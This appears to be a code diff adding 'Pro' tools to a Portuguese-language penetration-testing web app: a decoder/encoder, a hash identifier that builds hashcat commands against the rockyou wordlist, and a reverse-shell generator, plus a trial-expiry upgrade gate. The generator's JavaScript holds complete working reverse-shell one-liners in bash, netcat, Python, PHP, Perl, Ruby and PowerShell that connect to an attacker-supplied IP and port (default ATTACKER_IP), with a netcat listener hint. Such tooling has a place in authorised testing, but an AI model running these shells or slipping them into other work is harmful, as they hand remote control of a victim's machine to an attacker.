@@ -1667,25 +1667,35 @@
                     // TOOLS
                 </div>
                 <div id="toolsGrid" class="grid grid-cols-3 gap-2">
-                    <a href="/checklist" id="tool-checklist" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(249,115,22,0.15)] hover:border-[rgba(249,115,22,0.4)] hover:bg-[rgba(249,115,22,0.08)] transition-all group no-underline" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
-                        <i class="fas fa-list-check text-[#F97316] group-hover:scale-110 transition-transform tool-icon" style="filter: drop-shadow(0 0 5px rgba(249,115,22,0.5));"></i>
+                    <!-- Checklist -->
+                    <a href="/checklist" id="tool-checklist" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(249,115,22,0.15)] hover:border-[rgba(249,115,22,0.4)] hover:bg-[rgba(249,115,22,0.08)] transition-all group no-underline rounded-lg">
+                        <i class="fas fa-list-check text-[#F97316] group-hover:scale-110 transition-transform tool-icon"></i>
                         <span class="text-[8px] text-gray-400 group-hover:text-[#F97316] tool-label" style="font-family: var(--font-mono);">CHECKLIST</span>
                     </a>
-                    <a href="/scanner" id="tool-scanner" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,212,255,0.15)] hover:border-[rgba(0,212,255,0.4)] hover:bg-[rgba(0,212,255,0.08)] transition-all group no-underline" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
-                        <i class="fas fa-crosshairs text-[#00D4FF] group-hover:scale-110 transition-transform tool-icon" style="filter: drop-shadow(0 0 5px rgba(0,212,255,0.5));"></i>
-                        <span class="text-[8px] text-gray-400 group-hover:text-[#00D4FF] tool-label" style="font-family: var(--font-mono);">SCANNER</span>
-                    </a>
-                    <a href="/reports" id="tool-reports" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(168,85,247,0.15)] hover:border-[rgba(168,85,247,0.4)] hover:bg-[rgba(168,85,247,0.08)] transition-all group no-underline" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
-                        <i class="fas fa-file-alt text-[#A855F7] group-hover:scale-110 transition-transform tool-icon" style="filter: drop-shadow(0 0 5px rgba(168,85,247,0.5));"></i>
-                        <span class="text-[8px] text-gray-400 group-hover:text-[#A855F7] tool-label" style="font-family: var(--font-mono);">REPORTS</span>
-                    </a>
-                    <a href="/terminal" id="tool-terminal" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,255,136,0.15)] hover:border-[rgba(0,255,136,0.4)] hover:bg-[rgba(0,255,136,0.08)] transition-all group no-underline" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
-                        <i class="fas fa-terminal text-[#00FF88] group-hover:scale-110 transition-transform tool-icon" style="filter: drop-shadow(0 0 5px rgba(0,255,136,0.5));"></i>
-                        <span class="text-[8px] text-gray-400 group-hover:text-[#00FF88] tool-label" style="font-family: var(--font-mono);">TERMINAL</span>
-                    </a>
-                    <button onclick="exportChat()" class="flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(236,72,153,0.15)] hover:border-[rgba(236,72,153,0.4)] hover:bg-[rgba(236,72,153,0.08)] transition-all group" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
-                        <i class="fas fa-download text-[#EC4899] group-hover:scale-110 transition-transform" style="filter: drop-shadow(0 0 5px rgba(236,72,153,0.5));"></i>
-                        <span class="text-[8px] text-gray-400 group-hover:text-[#EC4899]" style="font-family: var(--font-mono);">EXPORT</span>
+                    <!-- Decoder/Encoder -->
+                    <button onclick="openTool('decoder')" id="tool-decoder" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,212,255,0.15)] hover:border-[rgba(0,212,255,0.4)] hover:bg-[rgba(0,212,255,0.08)] transition-all group rounded-lg">
+                        <i class="fas fa-code text-[#00D4FF] group-hover:scale-110 transition-transform tool-icon"></i>
+                        <span class="text-[8px] text-gray-400 group-hover:text-[#00D4FF] tool-label" style="font-family: var(--font-mono);">DECODER</span>
+                    </button>
+                    <!-- Hash Cracker -->
+                    <button onclick="openTool('hash')" id="tool-hash" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(239,68,68,0.15)] hover:border-[rgba(239,68,68,0.4)] hover:bg-[rgba(239,68,68,0.08)] transition-all group rounded-lg">
+                        <i class="fas fa-key text-[#EF4444] group-hover:scale-110 transition-transform tool-icon"></i>
+                        <span class="text-[8px] text-gray-400 group-hover:text-[#EF4444] tool-label" style="font-family: var(--font-mono);">HASH</span>
+                    </button>
+                    <!-- Reverse Shell Generator -->
+                    <button onclick="openTool('revshell')" id="tool-revshell" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,255,136,0.15)] hover:border-[rgba(0,255,136,0.4)] hover:bg-[rgba(0,255,136,0.08)] transition-all group rounded-lg">
+                        <i class="fas fa-terminal text-[#00FF88] group-hover:scale-110 transition-transform tool-icon"></i>
+                        <span class="text-[8px] text-gray-400 group-hover:text-[#00FF88] tool-label" style="font-family: var(--font-mono);">REVSHELL</span>
+                    </button>
+                    <!-- Wordlist Generator -->
+                    <button onclick="openTool('wordlist')" id="tool-wordlist" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(168,85,247,0.15)] hover:border-[rgba(168,85,247,0.4)] hover:bg-[rgba(168,85,247,0.08)] transition-all group rounded-lg">
+                        <i class="fas fa-file-lines text-[#A855F7] group-hover:scale-110 transition-transform tool-icon"></i>
+                        <span class="text-[8px] text-gray-400 group-hover:text-[#A855F7] tool-label" style="font-family: var(--font-mono);">WORDLIST</span>
+                    </button>
+                    <!-- Payloads Library -->
+                    <button onclick="openTool('payloads')" id="tool-payloads" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(236,72,153,0.15)] hover:border-[rgba(236,72,153,0.4)] hover:bg-[rgba(236,72,153,0.08)] transition-all group rounded-lg">
+                        <i class="fas fa-bomb text-[#EC4899] group-hover:scale-110 transition-transform tool-icon"></i>
+                        <span class="text-[8px] text-gray-400 group-hover:text-[#EC4899] tool-label" style="font-family: var(--font-mono);">PAYLOADS</span>
                     </button>
                 </div>
             </div>
@@ -1870,6 +1880,190 @@
                 </div>
                 <div class="p-4 border-t border-[rgba(0,255,136,0.1)]">
                     <button onclick="closeTemplatesModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Upgrade Modal (Trial Expirado) -->
+        <div id="upgradeModal" class="fixed inset-0 z-50 hidden items-center justify-center">
+            <div class="absolute inset-0 bg-black/90 backdrop-blur-sm" onclick="closeUpgradeModal()"></div>
+            <div class="relative z-10 w-full max-w-md mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,255,136,0.3)] shadow-2xl overflow-hidden">
+                <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#00FF88] via-[#00D4FF] to-[#8b5cf6]"></div>
+                <div class="p-6 text-center">
+                    <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-gradient-to-br from-[#00FF88]/20 to-[#00D4FF]/20 flex items-center justify-center border border-[#00FF88]/30">
+                        <i class="fas fa-crown text-4xl text-[#00FF88]"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold text-white mb-2">Acesso Pro Necessário</h3>
+                    <p class="text-gray-400 mb-6">Seu período de trial expirou. Faça upgrade para continuar usando as ferramentas Pro.</p>
+                    <div class="space-y-3">
+                        <a href="/profile#plans" class="block w-full bg-gradient-to-r from-[#00FF88] to-[#00D4FF] text-[#0a0a0f] font-bold py-3 rounded-xl hover:opacity-90 transition-all">
+                            <i class="fas fa-rocket mr-2"></i>Ver Planos
+                        </a>
+                        <button onclick="closeUpgradeModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Decoder/Encoder Modal -->
+        <div id="decoderModal" class="fixed inset-0 z-50 hidden items-center justify-center">
+            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeDecoderModal()"></div>
+            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,212,255,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
+                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00D4FF] to-transparent"></div>
+                <div class="p-6 border-b border-[rgba(0,212,255,0.1)]">
+                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,212,255,0.1)] border border-[rgba(0,212,255,0.3)] flex items-center justify-center">
+                            <i class="fas fa-code text-[#00D4FF]"></i>
+                        </div>
+                        Decoder / Encoder
+                    </h3>
+                </div>
+                <div class="flex-1 overflow-y-auto p-6">
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Tipo</label>
+                            <select id="decoderType" class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF]">
+                                <option value="base64">Base64</option>
+                                <option value="url">URL Encode</option>
+                                <option value="html">HTML Entities</option>
+                                <option value="hex">Hexadecimal</option>
+                                <option value="unicode">Unicode</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Input</label>
+                            <textarea id="decoderInput" rows="4" placeholder="Cole o texto aqui..." class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF] font-mono text-sm resize-none"></textarea>
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="decodeEncode('encode')" class="flex-1 bg-[#00D4FF]/20 hover:bg-[#00D4FF]/30 text-[#00D4FF] rounded-xl py-2 font-medium transition-all border border-[#00D4FF]/30">
+                                <i class="fas fa-lock mr-2"></i>Encode
+                            </button>
+                            <button onclick="decodeEncode('decode')" class="flex-1 bg-[#00FF88]/20 hover:bg-[#00FF88]/30 text-[#00FF88] rounded-xl py-2 font-medium transition-all border border-[#00FF88]/30">
+                                <i class="fas fa-unlock mr-2"></i>Decode
+                            </button>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Output</label>
+                            <div class="relative">
+                                <textarea id="decoderOutput" rows="4" readonly class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-[#00FF88] focus:outline-none font-mono text-sm resize-none"></textarea>
+                                <button onclick="copyDecoderOutput()" class="absolute top-2 right-2 text-gray-500 hover:text-[#00D4FF] transition-colors">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="p-4 border-t border-[rgba(0,212,255,0.1)]">
+                    <button onclick="closeDecoderModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Hash Identifier Modal -->
+        <div id="hashModal" class="fixed inset-0 z-50 hidden items-center justify-center">
+            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeHashModal()"></div>
+            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(239,68,68,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
+                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#EF4444] to-transparent"></div>
+                <div class="p-6 border-b border-[rgba(239,68,68,0.1)]">
+                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-[rgba(239,68,68,0.1)] border border-[rgba(239,68,68,0.3)] flex items-center justify-center">
+                            <i class="fas fa-key text-[#EF4444]"></i>
+                        </div>
+                        Hash Identifier
+                    </h3>
+                </div>
+                <div class="flex-1 overflow-y-auto p-6">
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Hash</label>
+                            <input type="text" id="hashInput" placeholder="Cole o hash aqui..." class="w-full bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#EF4444] font-mono">
+                        </div>
+                        <button onclick="identifyHash()" class="w-full bg-gradient-to-r from-[#EF4444] to-[#DC2626] hover:opacity-90 text-white rounded-xl py-3 font-bold transition-all">
+                            <i class="fas fa-search mr-2"></i>Identificar Hash
+                        </button>
+                        <div id="hashOutput" class="bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl p-4 min-h-[80px]">
+                            <span class="text-gray-500 text-sm">Resultado aparecerá aqui...</span>
+                        </div>
+                        <div class="border-t border-[rgba(239,68,68,0.1)] pt-4">
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Gerar Comando Hashcat</label>
+                            <select id="hashTypeSelect" class="w-full bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#EF4444] mb-2">
+                                <option value="0">MD5 (0)</option>
+                                <option value="100">SHA-1 (100)</option>
+                                <option value="1400">SHA-256 (1400)</option>
+                                <option value="1700">SHA-512 (1700)</option>
+                                <option value="1000">NTLM (1000)</option>
+                                <option value="3200">bcrypt (3200)</option>
+                                <option value="1800">SHA-512 Crypt (1800)</option>
+                            </select>
+                            <button onclick="generateHashcatCmd()" class="w-full bg-[#EF4444]/20 hover:bg-[#EF4444]/30 text-[#EF4444] rounded-xl py-2 font-medium transition-all border border-[#EF4444]/30">
+                                <i class="fas fa-terminal mr-2"></i>Gerar Comando
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="p-4 border-t border-[rgba(239,68,68,0.1)]">
+                    <button onclick="closeHashModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Reverse Shell Generator Modal -->
+        <div id="revshellModal" class="fixed inset-0 z-50 hidden items-center justify-center">
+            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeRevshellModal()"></div>
+            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,255,136,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
+                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00FF88] to-transparent"></div>
+                <div class="p-6 border-b border-[rgba(0,255,136,0.1)]">
+                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.3)] flex items-center justify-center">
+                            <i class="fas fa-terminal text-[#00FF88]"></i>
+                        </div>
+                        Reverse Shell Generator
+                    </h3>
+                </div>
+                <div class="flex-1 overflow-y-auto p-6">
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">IP do Atacante</label>
+                                <input type="text" id="revshellIP" placeholder="10.10.14.1" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Porta</label>
+                                <input type="text" id="revshellPort" placeholder="4444" value="4444" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Tipo de Shell</label>
+                            <select id="revshellType" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88]">
+                                <option value="bash">Bash TCP</option>
+                                <option value="bash_udp">Bash UDP</option>
+                                <option value="nc">Netcat -e</option>
+                                <option value="nc_mkfifo">Netcat mkfifo</option>
+                                <option value="python">Python</option>
+                                <option value="python3">Python3</option>
+                                <option value="php">PHP</option>
+                                <option value="perl">Perl</option>
+                                <option value="ruby">Ruby</option>
+                                <option value="powershell">PowerShell</option>
+                            </select>
+                        </div>
+                        <button onclick="generateRevshell()" class="w-full bg-gradient-to-r from-[#00FF88] to-[#00D4FF] hover:opacity-90 text-[#0a0a0f] rounded-xl py-3 font-bold transition-all">
+                            <i class="fas fa-wand-magic-sparkles mr-2"></i>Gerar Reverse Shell
+                        </button>
+                        <div class="hidden" id="revshellOutputContainer">
+                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Comando Gerado</label>
+                            <div class="relative">
+                                <pre id="revshellOutput" class="bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl p-4 text-[#00FF88] font-mono text-sm overflow-x-auto whitespace-pre-wrap break-all"></pre>
+                                <button onclick="copyRevshell()" class="absolute top-2 right-2 text-gray-500 hover:text-[#00FF88] transition-colors">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                            <p class="text-gray-500 text-xs mt-2"><i class="fas fa-info-circle mr-1"></i>Listener: <code class="text-[#00D4FF]">nc -lvnp 4444</code></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="p-4 border-t border-[rgba(0,255,136,0.1)]">
+                    <button onclick="closeRevshellModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                 </div>
             </div>
         </div>
@@ -4789,6 +4983,215 @@ Analise este resultado e me ajude a:
             const modal = document.getElementById('wordlistModal');
             modal.classList.add('hidden');
             modal.classList.remove('flex');
+        }
+        
+        // ========================================
+        // FERRAMENTAS PRO - openTool
+        // ========================================
+        function openTool(toolName) {
+            // Verifica se usuário tem acesso (trial ou plano pago)
+            if (!checkToolAccess()) {
+                showUpgradeModal();
+                return;
+            }
+            
+            switch(toolName) {
+                case 'decoder':
+                    openDecoderModal();
+                    break;
+                case 'hash':
+                    openHashModal();
+                    break;
+                case 'revshell':
+                    openRevshellModal();
+                    break;
+                case 'wordlist':
+                    openWordlistModal();
+                    break;
+                case 'payloads':
+                    openPayloadModal();
+                    break;
+                default:
+                    showNotification('Ferramenta não encontrada', 'error');
+            }
+        }
+        
+        function checkToolAccess() {
+            // Admin sempre tem acesso
+            if (currentUser?.role === 'admin') return true;
+            
+            // Verifica se tem plano Pro/Elite
+            const planId = currentUser?.plan_id;
+            if (planId && planId > 1) return true;
+            
+            // Verifica trial (2 dias)
+            const trialEndsAt = currentUser?.trial_ends_at;
+            if (trialEndsAt) {
+                const trialEnd = new Date(trialEndsAt);
+                if (trialEnd > new Date()) return true;
+            }
+            
+            return false;
+        }
+        
+        function showUpgradeModal() {
+            const modal = document.getElementById('upgradeModal');
+            if (modal) {
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+            } else {
+                showNotification('Faça upgrade para acessar ferramentas Pro!', 'warning');
+                window.location.href = '/profile#plans';
+            }
+        }
+        
+        function closeUpgradeModal() {
+            const modal = document.getElementById('upgradeModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+        
+        // Decoder/Encoder Modal
+        function openDecoderModal() {
+            const modal = document.getElementById('decoderModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+        
+        function closeDecoderModal() {
+            const modal = document.getElementById('decoderModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+        
+        function decodeEncode(action) {
+            const input = document.getElementById('decoderInput').value;
+            const type = document.getElementById('decoderType').value;
+            let result = '';
+            
+            try {
+                if (action === 'encode') {
+                    switch(type) {
+                        case 'base64': result = btoa(input); break;
+                        case 'url': result = encodeURIComponent(input); break;
+                        case 'html': result = input.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); break;
+                        case 'hex': result = input.split('').map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(''); break;
+                        case 'unicode': result = input.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join(''); break;
+                    }
+                } else {
+                    switch(type) {
+                        case 'base64': result = atob(input); break;
+                        case 'url': result = decodeURIComponent(input); break;
+                        case 'html': result = input.replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, m => ({'&amp;':'&','&lt;':'<','&gt;':'>','&quot;':'"','&#39;':"'"}[m])); break;
+                        case 'hex': result = input.match(/.{2}/g)?.map(h => String.fromCharCode(parseInt(h,16))).join('') || ''; break;
+                        case 'unicode': result = input.replace(/\\u[\dA-Fa-f]{4}/g, m => String.fromCharCode(parseInt(m.slice(2),16))); break;
+                    }
+                }
+                document.getElementById('decoderOutput').value = result;
+            } catch(e) {
+                showNotification('Erro ao processar: ' + e.message, 'error');
+            }
+        }
+        
+        function copyDecoderOutput() {
+            const output = document.getElementById('decoderOutput').value;
+            navigator.clipboard.writeText(output).then(() => showNotification('Copiado!', 'success'));
+        }
+        
+        // Hash Modal
+        function openHashModal() {
+            const modal = document.getElementById('hashModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+        
+        function closeHashModal() {
+            const modal = document.getElementById('hashModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+        
+        async function identifyHash() {
+            const hash = document.getElementById('hashInput').value.trim();
+            if (!hash) { showNotification('Digite um hash', 'error'); return; }
+            
+            const results = [];
+            const len = hash.length;
+            
+            // Identificação por tamanho e padrão
+            if (len === 32 && /^[a-f0-9]+$/i.test(hash)) results.push('MD5', 'NTLM');
+            if (len === 40 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-1');
+            if (len === 64 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-256');
+            if (len === 128 && /^[a-f0-9]+$/i.test(hash)) results.push('SHA-512');
+            if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) results.push('bcrypt');
+            if (hash.startsWith('$6$')) results.push('SHA-512 Crypt (Linux)');
+            if (hash.startsWith('$5$')) results.push('SHA-256 Crypt (Linux)');
+            if (hash.startsWith('$1$')) results.push('MD5 Crypt (Linux)');
+            if (hash.startsWith('$apr1$')) results.push('Apache MD5');
+            if (/^[a-f0-9]{32}:[a-f0-9]+$/i.test(hash)) results.push('MD5 + Salt');
+            
+            const output = document.getElementById('hashOutput');
+            if (results.length > 0) {
+                output.innerHTML = '<div class="text-green-400 mb-2">Possíveis tipos:</div>' + 
+                    results.map(r => `<div class="text-cyan-400">• ${r}</div>`).join('');
+            } else {
+                output.innerHTML = '<div class="text-yellow-400">Tipo não identificado. Tente usar hashcat --identify ou hash-identifier.</div>';
+            }
+        }
+        
+        function generateHashcatCmd() {
+            const hash = document.getElementById('hashInput').value.trim();
+            const hashType = document.getElementById('hashTypeSelect').value;
+            const wordlist = '/usr/share/wordlists/rockyou.txt';
+            
+            const cmd = `hashcat -m ${hashType} -a 0 hash.txt ${wordlist} --force`;
+            document.getElementById('hashOutput').innerHTML = `
+                <div class="text-gray-400 mb-2">Comando Hashcat:</div>
+                <code class="text-green-400 block bg-black/50 p-2 rounded">${cmd}</code>
+                <div class="text-gray-500 text-xs mt-2">Salve o hash em hash.txt antes de executar</div>
+            `;
+        }
+        
+        // Reverse Shell Modal
+        function openRevshellModal() {
+            const modal = document.getElementById('revshellModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+        
+        function closeRevshellModal() {
+            const modal = document.getElementById('revshellModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        }
+        
+        function generateRevshell() {
+            const ip = document.getElementById('revshellIP').value || 'ATTACKER_IP';
+            const port = document.getElementById('revshellPort').value || '4444';
+            const type = document.getElementById('revshellType').value;
+            
+            const shells = {
+                bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+                bash_udp: `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
+                nc: `nc -e /bin/bash ${ip} ${port}`,
+                nc_mkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+                python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+                python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+                php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+                perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+                ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+                powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+            };
+            
+            const output = document.getElementById('revshellOutput');
+            const container = document.getElementById('revshellOutputContainer');
+            output.textContent = shells[type] || 'Tipo não suportado';
+            container.classList.remove('hidden');
+        }
+        
+        function copyRevshell() {
+            const output = document.getElementById('revshellOutput').textContent;
+            navigator.clipboard.writeText(output).then(() => showNotification('Copiado!', 'success'));
         }
         
         async function init() {
